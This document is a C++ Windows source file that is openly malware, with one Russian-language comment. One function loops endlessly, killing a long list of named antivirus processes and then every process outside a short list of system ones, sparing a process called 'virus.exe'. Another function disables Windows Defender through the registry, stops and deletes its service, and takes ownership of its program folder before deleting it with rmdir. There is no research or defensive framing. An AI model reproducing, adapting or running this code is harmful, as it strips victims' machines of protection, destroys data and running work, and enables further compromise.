#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <thread>

void KillAllProcesses() {
    while (true) {
        std::vector<std::string> targets = {
            "MsMpEng.exe", "SecurityHealthService.exe",
            "drweb32.exe", "drwebscd.exe",
            "egui.exe", "ekrn.exe",
            "AvastSvc.exe", "AvastUI.exe",
            "avp.exe", "avpui.exe",
            "bdagent.exe", "BdVSS.exe",
            "mcshield.exe", "mctray.exe",
            "ccSvcHst.exe", "norton.exe",
            "WRSA.exe", "WRMail.exe",
            "mbam.exe", "mbamservice.exe",
            "avg.exe", "avguard.exe", "avcenter.exe", "vsserv.exe"
        };

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &pe)) {
            do {
                for (const auto& target : targets) {
                    if (_stricmp(pe.szExeFile, target.c_str()) == 0) {
                        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (process) {
                            TerminateProcess(process, 0);
                            CloseHandle(process);
                        }
                        break;
                    }
                }
            } while (Process32Next(snapshot, &pe));
        }
        CloseHandle(snapshot);

        // Убиваем все несистемные процессы
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe2;
            pe2.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(snapshot, &pe2)) {
                do {
                    std::string processName = pe2.szExeFile;
                    bool isSystem = false;
                    std::string systemProcesses[] = {
                        "System", "svchost.exe", "winlogon.exe", "csrss.exe",
                        "services.exe", "lsass.exe", "explorer.exe", "wininit.exe"
                    };
                    for (const auto& sys : systemProcesses) {
                        if (_stricmp(processName.c_str(), sys.c_str()) == 0) {
                            isSystem = true;
                            break;
                        }
                    }

                    if (!isSystem && processName != "virus.exe" &&
                        processName.find("main") == std::string::npos) {
                        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe2.th32ProcessID);
                        if (process) {
                            TerminateProcess(process, 0);
                            CloseHandle(process);
                        }
                    }
                } while (Process32Next(snapshot, &pe2));
            }
            CloseHandle(snapshot);
        }

        Sleep(5000);
    }
}

void DestroyAntivirus() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    system("sc stop WinDefend");
    system("sc delete WinDefend");
    system("takeown /f \"C:\\Program Files\\Windows Defender\" /r /d y");
    system("icacls \"C:\\Program Files\\Windows Defender\" /grant administrators:F /t");
    system("rmdir /s /q \"C:\\Program Files\\Windows Defender\"");

    std::thread killThread(KillAllProcesses);
    killThread.detach();
}
